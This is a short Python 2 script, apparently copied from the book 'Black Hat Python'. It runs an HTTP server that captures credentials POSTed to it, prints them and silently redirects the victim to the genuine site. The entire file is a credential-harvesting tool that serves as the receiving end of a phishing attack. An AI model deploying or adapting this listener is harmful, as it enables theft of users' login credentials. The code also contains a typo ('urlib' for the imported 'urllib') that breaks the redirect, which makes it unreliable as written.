#
# Simple HTTP server as presented in 'Black Hat Python'
# included for the purpose of testing particular modules
#

import SimpleHTTPServer
import SocketServer
import urllib

class CredREquestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        creds = self.rfile.read(content_length).decode('utf-8')
        print creds
        site = self.path[1:]
        self.send_response(301)
        self.send_header('Location', urlib.unquote(site))
        self.end_headers()

server = SocketServer.TCPServer(('0.0.0.0', 8080), CredREquestHandler)
server.serve_forever()
